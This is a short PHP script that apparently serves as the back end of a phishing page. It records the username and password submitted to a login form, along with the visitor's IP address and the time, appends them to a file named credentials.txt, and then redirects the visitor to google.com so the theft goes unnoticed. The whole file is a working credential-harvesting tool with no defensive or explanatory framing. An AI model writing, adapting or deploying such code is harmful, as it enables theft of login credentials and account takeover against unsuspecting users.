<?php
try {
        $FileHandle = fopen ("./credentials.txt" , "a") ;
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
                $ip = $_SERVER['REMOTE_ADDR'];
        }
$nowtime = date('Y-m-d H:i');
$username = $_POST['username'];
$password = $_POST['password'];
fwrite($FileHandle, "Remote IP : $ip || Username : $username || Password : $password || Time : $nowtime \n") ;

fclose($FileHandle);
} catch (Exception $e) {
}
?>
<html>
<head>
<?php
header("Location: https://google.com");
?>
</head>
<body>
</body>
</html>